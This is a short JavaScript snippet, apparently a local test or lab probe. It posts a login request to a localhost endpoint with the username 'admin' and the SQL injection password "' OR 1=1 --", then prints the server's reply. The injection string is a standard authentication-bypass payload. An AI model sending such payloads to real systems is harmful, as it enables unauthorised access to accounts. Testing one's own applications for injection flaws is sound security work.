fetch('http://localhost:3000/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: "admin", password: "' OR 1=1 --" })
}).then(res => res.text()).then(t => console.log('Response:', t)).catch(console.error);
